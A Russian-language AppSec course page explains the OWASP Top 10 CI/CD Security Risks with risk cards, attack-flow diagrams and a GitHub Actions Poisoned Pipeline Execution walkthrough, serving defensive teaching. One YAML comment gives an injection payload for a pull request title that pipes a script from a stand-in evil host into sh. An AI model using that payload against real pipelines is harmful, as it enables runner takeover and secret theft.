---
hide:
  - toc
title: "OWASP Top 10 CI/CD Risks | Курс AppSec"
description: "OWASP Top 10 CI/CD Security Risks по-русски: десять рисков CICD-SEC-1…10, как атакуют и как защищаться, разбор Poisoned Pipeline Execution."
keywords: "OWASP, CI/CD, DevSecOps, риски, GitHub Actions, pipeline, секреты, AppSec, SCM, supply chain, зависимости, конвейер, Шмаков Илья, Elijah Shmakov, geminishkv, AppSecTA"
---

<div class="hero-section hero-section--compact">
  <div class="hero-content">
    <h1 class="hero-title">OWASP — CI/CD Risks</h1>
    <p class="hero-sub">Десять рисков конвейера поставки: CICD-SEC-1…10</p>
  </div>
</div>

## О документе

OWASP Top 10 CI/CD Security Risks — список десяти самых опасных слабых мест конвейеров сборки и доставки. Он вырос из разбора реальных атак на цепочку поставки: взломщику незачем ломать приложение, если можно изменить то, что его собирает. Конвейер исполняет чужой код, хранит секреты и имеет право выкатывать в production — это самая привилегированная часть инфраструктуры разработки.

Риски обозначаются `CICD-SEC-1` … `CICD-SEC-10`. Номер — это идентификатор, а не место в рейтинге: порядок в списке не означает важность.

На практике страница нужна для [Лаб. 09 · DevSecOps CI/CD на GitHub Actions](../../labs/basic/lab09.md): каждое требование к workflow в ней закрывает один из этих рисков.

## Где в конвейере бьёт каждый риск

Схема показывает путь изменения от разработчика до релиза и то, какие риски действуют на каждом этапе.

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Риски OWASP CI/CD по этапам конвейера
    accDescr: Изменение проходит репозиторий, сборку и доставку; на каждом этапе действуют свои риски из списка OWASP CI/CD Security Risks, а три риска — учётные записи, конфигурация систем и журналы — относятся ко всей цепочке.

    change_sent(["Разработчик отправляет<br/>изменение"])

    subgraph scm_stage ["Репозиторий"]
        direction TB
        review_change["Ревью и слияние<br/>SEC-1, SEC-4"]
    end

    subgraph build_stage ["Сборка"]
        direction TB
        fetch_deps["Загрузка зависимостей<br/>и сторонних actions<br/>SEC-3, SEC-8"]
        run_jobs["Выполнение jobs<br/>с секретами и правами<br/>SEC-5, SEC-6"]
        fetch_deps --> run_jobs
    end

    subgraph delivery_stage ["Доставка"]
        direction TB
        build_artifact[/"Артефакт или образ<br/>SEC-9"/]
        deploy_release[[Деплой]]
        build_artifact --> deploy_release
    end

    release_live([Релиз работает])

    change_sent --> scm_stage
    scm_stage --> build_stage
    build_stage --> delivery_stage
    delivery_stage --> release_live

    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class review_change,fetch_deps,run_jobs,deploy_release stage
    class release_live done
```

**Как читать схему:**

- Рамки — этапы конвейера, внутри блоков подписаны риски, которые действуют именно здесь. `SEC-4` означает `CICD-SEC-4`.
- На этапе «Репозиторий» решается, попадёт ли изменение в конвейер вообще: без контроля потока (SEC-1) остальные меры обходятся одним push.
- Самый плотный этап — «Сборка»: здесь исполняется чужой код (SEC-3, SEC-8), и у него под рукой секреты и права конвейера (SEC-5, SEC-6).
- Три риска на схему не попали, потому что относятся ко всей цепочке сразу: учётные записи (SEC-2), настройка самих систем (SEC-7) и журналы (SEC-10).

Обозначения — в материале [Как читать схемы курса](../diagrams_legend.md).

## Десять рисков

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(min(19rem, 100%), 1fr));">

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-1</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Insufficient Flow Control Mechanisms</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Один человек или один токен может довести изменение до production без чужого подтверждения.</dd>
    <dt>Атака</dt><dd>Взломанная учётная запись разработчика пушит код прямо в основную ветку или сама одобряет свой pull request; правило авто-слияния пропускает изменение без ревью.</dd>
    <dt>Защита</dt><dd>Защита основной ветки, обязательное ревью другим человеком, запрет одобрять собственный pull request, минимум правил авто-слияния.</dd>
    <dt>В курсе</dt><dd>Так сдаются лабораторные: работа в <code>develop</code>, pull request, approve преподавателя.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-2</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Inadequate Identity and Access Management</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Учётных записей много, они разбросаны по SCM, CI и реестрам, и прав у них больше, чем нужно.</dd>
    <dt>Атака</dt><dd>Забытая учётная запись уволенного сотрудника, личная почта вместо корпоративной, общий аккаунт на команду, внешний подрядчик с правами администратора.</dd>
    <dt>Защита</dt><dd>Реестр учётных записей, минимальные права, отключение неактивных, SSO и MFA, никаких общих аккаунтов.</dd>
    <dt>В курсе</dt><dd><code>gh auth status</code> показывает, какие права выданы вашему токену, — в шпаргалке GitHub CLI.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-3</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Dependency Chain Abuse</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Сборка сама скачивает и исполняет чужой код — зависимости.</dd>
    <dt>Атака</dt><dd>Dependency confusion (публичный пакет с именем внутреннего), typosquatting (имя с опечаткой), захват заброшенного пакета. Вредоносный код выполняется уже на этапе установки.</dd>
    <dt>Защита</dt><dd>Лок-файлы с хешами, закреплённые версии, свой прокси-реестр, области имён (scopes), запрет install-скриптов там, где они не нужны.</dd>
    <dt>В курсе</dt><dd>Лаб. 07: анализ зависимостей (SCA); в Лаб. 09 версии инструментов закреплены.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-4</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Poisoned Pipeline Execution</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Имея доступ только к репозиторию, атакующий заставляет конвейер выполнить свои команды.</dd>
    <dt>Атака</dt><dd>Прямая: правка файла workflow в своей ветке. Косвенная: правка того, что конвейер запускает, — Makefile, скрипта, теста. Публичная: pull request из форка в открытый репозиторий.</dd>
    <dt>Защита</dt><dd>Непроверенный код — на изолированных runner-ах без секретов; файлы конвейера под защитой ветки и CODEOWNERS; данные из событий — только через <code>env</code>.</dd>
    <dt>В курсе</dt><dd>Разобрано ниже с примером; <code>pull_request_target</code> — в шпаргалке GitHub Actions Security.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-5</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Insufficient Pipeline-Based Access Controls</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Job конвейера видит больше, чем ему нужно: секреты, соседние конвейеры, хост, сеть.</dd>
    <dt>Атака</dt><dd>Один скомпрометированный шаг (например, вредоносная зависимость) читает все секреты репозитория и пишет в него с правами конвейера.</dd>
    <dt>Защита</dt><dd>Минимальные права на каждый job, секреты по окружениям, одноразовые runner-ы, раздельные runner-ы для доверенного и недоверенного кода.</dd>
    <dt>В курсе</dt><dd>Лаб. 09: блок <code>permissions</code> в workflow, по умолчанию только <code>contents: read</code>.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-6</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Insufficient Credential Hygiene</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Секреты лежат там, где их можно найти: в коде, в истории Git, в логах сборки, в слоях образа.</dd>
    <dt>Атака</dt><dd>Поиск по истории репозитория и по публичным логам CI; секрет, который ни разу не меняли, работает и через год после утечки.</dd>
    <dt>Защита</dt><dd>Сканирование секретов до коммита и в конвейере, ротация, короткоживущие токены (OIDC) вместо вечных, запрет печатать секреты в лог.</dd>
    <dt>В курсе</dt><dd>Лаб. 07: gitleaks и TruffleHog; Лаб. 09: секреты репозитория через <code>secrets.*</code>.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-7</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Insecure System Configuration</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Сами системы конвейера — SCM, CI-сервер, реестр артефактов — настроены небезопасно.</dd>
    <dt>Атака</dt><dd>Необновлённый self-hosted CI с известной уязвимостью, пароль по умолчанию, панель администратора, доступная из интернета.</dd>
    <dt>Защита</dt><dd>Инвентаризация и обновления, настройка по бенчмаркам (CIS), закрытый сетевой доступ, регулярная сверка конфигурации.</dd>
    <dt>В курсе</dt><dd>Лаб. 06 показывает сам подход: проверка конфигурации по CIS Docker Benchmark.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-8</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Ungoverned Usage of 3rd Party Services</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Сторонние приложения, интеграции и actions получают доступ к репозиторию без учёта и пересмотра.</dd>
    <dt>Атака</dt><dd>Компрометация популярного action: теги переставляются на вредоносный коммит, и он выполняется во всех конвейерах, где action подключён по тегу.</dd>
    <dt>Защита</dt><dd>Согласование перед подключением, actions только по хешу коммита, минимальные права приложений, регулярное удаление неиспользуемых.</dd>
    <dt>В курсе</dt><dd>Лаб. 09: все actions закреплены по хешу; как получить хеш — раздел API в шпаргалке GitHub CLI.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-9</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Improper Artifact Integrity Validation</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Нельзя доказать, что в production попало именно то, что собрано из проверенного кода.</dd>
    <dt>Атака</dt><dd>Подмена артефакта в реестре или скрипта установки по пути: конвейер скачивает и запускает изменённый файл, не сверяя его ни с чем.</dd>
    <dt>Защита</dt><dd>Подпись коммитов и артефактов, сверка контрольных сумм скачанных инструментов, SBOM и аттестации происхождения, деплой образа по digest.</dd>
    <dt>В курсе</dt><dd>Лаб. 01: подписанные коммиты и теги; реестр образов и деплой по digest — в справочнике портов.</dd>
  </dl>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.5rem;">
  <div style="display:flex; align-items:baseline; gap:0.6rem; width:100%; flex-wrap:wrap;">
    <span class="lab-card-num" style="font-size:0.9rem; width:auto;">CICD-SEC-10</span>
    <span style="font-size:0.65rem; color:#888; font-family:var(--font-code);">Insufficient Logging and Visibility</span>
  </div>
  <dl class="lab-card-facts">
    <dt>Суть</dt><dd>Журналов нет или их никто не смотрит, поэтому атаку нельзя ни заметить, ни расследовать.</dd>
    <dt>Атака</dt><dd>Добавленный deploy-ключ, изменённое правило защиты ветки или новый workflow остаются незамеченными месяцами.</dd>
    <dt>Защита</dt><dd>Включённый audit log, отправка журналов в SIEM, оповещения о событиях: новые ключи, смена правил защиты, правки workflow.</dd>
    <dt>В курсе</dt><dd>Лаб. 09: отчёты сканеров сохраняются артефактами запуска — их можно поднять и после прогона.</dd>
  </dl>
  </div>

</div>

## Как происходит атака: схема на каждый риск

Каждая схема читается сверху вниз: с чего начинает нарушитель, какое место конвейера он использует и к чему это приводит. Ромб — место, где атаку останавливает защита: ветка «Да» показывает, что происходит при работающей защите, ветка «Нет» — итог при её отсутствии. Меры защиты по каждому риску разобраны в карточках выше. Обозначения фигур — в справочнике [Схемы курса](../diagrams_legend.md).

### CICD-SEC-1 · Insufficient Flow Control Mechanisms

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-1 Insufficient Flow Control Mechanisms
    accDescr: Нарушитель: учётная запись разработчика. Затем: код отправляется сразу в защищённую ветку. Если защита на месте (ветка защищена: ревью и запрет прямого push), изменение ждёт второго человека. Если защиты нет, конвейер собирает и выкатывает код; итог: чужой код в продуктиве.

    start_actor(["Нарушитель: учётная<br/>запись разработчика"])
    step_one["Код отправляется сразу<br/>в защищённую ветку"]
    control_gate{"Ветка защищена: ревью<br/>и запрет прямого push?"}
    control_fork((" "))
    attack_stopped(["Изменение ждёт второго<br/>человека"])
    impact_step["Конвейер собирает и<br/>выкатывает код"]
    attack_result(["Итог: чужой код в<br/>продуктиве"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-2 · Inadequate Identity and Access Management

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-2 Inadequate Identity and Access Management
    accDescr: Нарушитель: забытая или избыточная учётная запись. Затем: вход под ней без второго фактора. Если защита на месте (права минимальны, записи пересматриваются), доступа хватает только на чтение. Если защиты нет, доступ на запись в репозитории и конвейер; итог: контроль над кодом и сборкой.

    start_actor(["Нарушитель: забытая<br/>или избыточная учётная<br/>запись"])
    step_one["Вход под ней без<br/>второго фактора"]
    control_gate{"Права минимальны,<br/>записи<br/>пересматриваются?"}
    control_fork((" "))
    attack_stopped(["Доступа хватает только<br/>на чтение"])
    impact_step["Доступ на запись в<br/>репозитории и конвейер"]
    attack_result(["Итог: контроль над<br/>кодом и сборкой"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-3 · Dependency Chain Abuse

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-3 Dependency Chain Abuse
    accDescr: Нарушитель публикует пакет с похожим именем. Затем: сборка запрашивает зависимость по имени. Если защита на месте (версии закреплены, источник задан явно), берётся проверенный пакет. Если защиты нет, установлен пакет нарушителя; итог: его код выполняется в сборке.

    start_actor(["Нарушитель публикует<br/>пакет с похожим именем"])
    step_one["Сборка запрашивает<br/>зависимость по имени"]
    control_gate{"Версии закреплены,<br/>источник задан явно?"}
    control_fork((" "))
    attack_stopped(["Берётся проверенный<br/>пакет"])
    impact_step["Установлен пакет<br/>нарушителя"]
    attack_result(["Итог: его код<br/>выполняется в сборке"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-4 · Poisoned Pipeline Execution

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-4 Poisoned Pipeline Execution
    accDescr: Нарушитель: pull request с изменённым workflow. Затем: конвейер запускается на коде из pull request. Если защита на месте (чужой код идёт без секретов и прав записи), вредный шаг ничего не получает. Если защиты нет, команды нарушителя идут с секретами конвейера; итог: кража секретов, подмена артефактов.

    start_actor(["Нарушитель: pull<br/>request с изменённым<br/>workflow"])
    step_one["Конвейер запускается<br/>на коде из pull<br/>request"]
    control_gate{"Чужой код идёт без<br/>секретов и прав<br/>записи?"}
    control_fork((" "))
    attack_stopped(["Вредный шаг ничего не<br/>получает"])
    impact_step["Команды нарушителя<br/>идут с секретами<br/>конвейера"]
    attack_result(["Итог: кража секретов,<br/>подмена артефактов"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-5 · Insufficient Pipeline-Based Access Controls

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-5 Insufficient Pipeline-Based Access Controls
    accDescr: Нарушитель: код в одном из job. Затем: job обращается к секретам и средам соседей. Если защита на месте (у каждого job свои права и свои секреты), доступ ограничен своим job. Если защиты нет, один job видит всё окружение; итог: движение от сборки к продуктиву.

    start_actor(["Нарушитель: код в<br/>одном из job"])
    step_one["Job обращается к<br/>секретам и средам<br/>соседей"]
    control_gate{"У каждого job свои<br/>права и свои секреты?"}
    control_fork((" "))
    attack_stopped(["Доступ ограничен своим<br/>job"])
    impact_step["Один job видит всё<br/>окружение"]
    attack_result(["Итог: движение от<br/>сборки к продуктиву"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-6 · Insufficient Credential Hygiene

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-6 Insufficient Credential Hygiene
    accDescr: Нарушитель: чтение кода, истории и логов. Затем: поиск токенов и паролей. Если защита на месте (секреты в хранилище, маскируются, ротируются), в коде и логах секретов нет. Если защиты нет, найден действующий токен; итог: доступ к облаку и реестрам.

    start_actor(["Нарушитель: чтение<br/>кода, истории и логов"])
    step_one["Поиск токенов и<br/>паролей"]
    control_gate{"Секреты в хранилище,<br/>маскируются,<br/>ротируются?"}
    control_fork((" "))
    attack_stopped(["В коде и логах<br/>секретов нет"])
    impact_step["Найден действующий<br/>токен"]
    attack_result(["Итог: доступ к облаку<br/>и реестрам"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-7 · Insecure System Configuration

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-7 Insecure System Configuration
    accDescr: Нарушитель: поиск служебных систем конвейера. Затем: обращение к раннеру или серверу сборки. Если защита на месте (системы обновлены и настроены по базовой линии), входа нет. Если защиты нет, известная уязвимость или настройка по умолчанию; итог: контроль над сервером сборки.

    start_actor(["Нарушитель: поиск<br/>служебных систем<br/>конвейера"])
    step_one["Обращение к раннеру<br/>или серверу сборки"]
    control_gate{"Системы обновлены и<br/>настроены по базовой<br/>линии?"}
    control_fork((" "))
    attack_stopped(["Входа нет"])
    impact_step["Известная уязвимость<br/>или настройка по<br/>умолчанию"]
    attack_result(["Итог: контроль над<br/>сервером сборки"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-8 · Ungoverned Usage of 3rd Party Services

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-8 Ungoverned Usage of 3rd Party Services
    accDescr: Нарушитель: взломанное стороннее приложение. Затем: приложение действует с выданными ему правами. Если защита на месте (права приложений минимальны, пересматриваются), ущерб ограничен выданным доступом. Если защиты нет, у приложения запись во все репозитории; итог: изменение кода через чужой сервис.

    start_actor(["Нарушитель: взломанное<br/>стороннее приложение"])
    step_one["Приложение действует с<br/>выданными ему правами"]
    control_gate{"Права приложений<br/>минимальны,<br/>пересматриваются?"}
    control_fork((" "))
    attack_stopped(["Ущерб ограничен<br/>выданным доступом"])
    impact_step["У приложения запись во<br/>все репозитории"]
    attack_result(["Итог: изменение кода<br/>через чужой сервис"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-9 · Improper Artifact Integrity Validation

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-9 Improper Artifact Integrity Validation
    accDescr: Нарушитель: подмена артефакта в реестре. Затем: развёртывание берёт артефакт по тегу. Если защита на месте (подпись и digest проверяются), подменённый артефакт отклонён. Если защиты нет, развёрнут артефакт нарушителя; итог: чужой код в продуктиве.

    start_actor(["Нарушитель: подмена<br/>артефакта в реестре"])
    step_one["Развёртывание берёт<br/>артефакт по тегу"]
    control_gate{"Подпись и digest<br/>проверяются?"}
    control_fork((" "))
    attack_stopped(["Подменённый артефакт<br/>отклонён"])
    impact_step["Развёрнут артефакт<br/>нарушителя"]
    attack_result(["Итог: чужой код в<br/>продуктиве"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

### CICD-SEC-10 · Insufficient Logging and Visibility

```mermaid
%%{init: {"flowchart": {"curve": "step"}}}%%
flowchart TB
    accTitle: Ход атаки: CICD-SEC-10 Insufficient Logging and Visibility
    accDescr: Нарушитель: действия в конвейере. Затем: изменение настроек, секретов и workflow. Если защита на месте (события пишутся, есть оповещения), вторжение замечено и остановлено. Если защиты нет, следов не остаётся; итог: атака живёт месяцами.

    start_actor(["Нарушитель: действия в<br/>конвейере"])
    step_one["Изменение настроек,<br/>секретов и workflow"]
    control_gate{"События пишутся, есть<br/>оповещения?"}
    control_fork((" "))
    attack_stopped(["Вторжение замечено и<br/>остановлено"])
    impact_step["Следов не остаётся"]
    attack_result(["Итог: атака живёт<br/>месяцами"])

    start_actor --> step_one
    step_one --> control_gate
    control_gate --- control_fork
    control_fork -->|Да| attack_stopped
    control_fork -->|Нет| impact_step
    impact_step --> attack_result

    classDef junction fill:#374151,stroke:#374151,stroke-width:1px,color:#374151,font-size:1px
    classDef stage fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#1e3a5f
    classDef gate fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,color:#713f12
    classDef done fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d

    class control_fork junction
    class step_one,impact_step stage
    class control_gate gate
    class start_actor,attack_stopped,attack_result done
```

## Разбор: Poisoned Pipeline Execution в GitHub Actions

Самый частый вариант — внедрение команд через данные события. Заголовок pull request, имя ветки, текст комментария пишет посторонний человек, а выражение `${{ }}` подставляется в скрипт до его запуска — как текст, а не как значение переменной.

```yaml
# Уязвимо: заголовок pull request становится частью shell-команды.
# Заголовок вида  a"; curl https://evil.example/x.sh | sh; echo "  выполнится на runner-е
- run: echo "PR: ${{ github.event.pull_request.title }}"
```

```yaml
# Безопасно: значение приходит в переменную окружения и остаётся данными
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $PR_TITLE"
```

!!! warning "Правило"
    Всё, что приходит из `github.event.*`, — недоверенный ввод: заголовки и тексты pull request и issue, имена веток, сообщения коммитов, логины. В `run:` такие значения попадают только через `env:`.

Второй вариант — триггер `pull_request_target`. В отличие от `pull_request`, он запускается в контексте основной ветки: с секретами и с правом записи. Если такой workflow забирает и исполняет код из pull request, секреты репозитория достаются любому, кто открыл pull request из форка.

## Разбор: сторонние actions по хешу коммита

Тег action — это указатель, который владелец репозитория может переставить на другой коммит. Так и устроены атаки на цепочку поставки через actions: после взлома популярного action его теги переводят на вредоносный коммит, и тот выполняется во всех конвейерах, подключивших action по тегу. Конвейеры, где action закреплён по хешу коммита, продолжают запускать прежний, проверенный код.

```yaml
- uses: actions/checkout@v4                                        # тег: можно переставить
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1 — хеш: переставить нельзя
```

Хеш для тега получают через `gh api` — команда есть в разделе API [шпаргалки GitHub CLI](../cheatsheet/CHEATSHEET_GH_CLI.md). Обновлять закреплённые хеши помогает Dependabot с экосистемой `github-actions`.

## Смотри также

- [CheatSheet: GitHub Actions Security](../cheatsheet/CHEATSHEET_GH_ACTIONS_SECURITY.md) — права, триггеры, секреты
- [Supply Chain Attacks](../examples/supply_chain_attacks.md) — разбор реальных атак на цепочку поставки
- [Классификация AppSec-инструментов](../appsec_tt.md) — какие сканеры закрывают какие риски

## Оригинал документа

![OWASP Top 10 - OWASP_Top_10_CICD_Risks](OWASP_Top_10_CICD_Risks.pdf){ type=application/pdf style="min-height:80vh;width:100%" }
